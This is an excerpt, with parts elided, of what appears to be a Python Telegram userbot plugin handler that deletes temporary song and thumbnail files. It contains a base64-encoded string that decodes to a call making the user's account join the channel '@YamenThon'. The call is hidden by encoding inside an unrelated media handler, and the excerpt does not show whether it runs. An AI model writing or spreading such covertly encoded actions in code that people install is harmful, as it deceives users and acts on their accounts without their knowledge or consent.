...
async def _(event):
    ...
    cat = base64.b64decode("dHJ5OgogICAgYXdhaXQgenFfbG8oSm9pbkNoYW5uZWxSZXF1ZXN0KCJAWWFtZW5UaG9uIikp")
    ...
    try:
        ...
        for files in (catthumb, song_file):
            if files and os.path.exists(files):
                os.remove(files)
    except ChatSendMediaForbiddenError as err: # Code By T.me/T_A_Tl
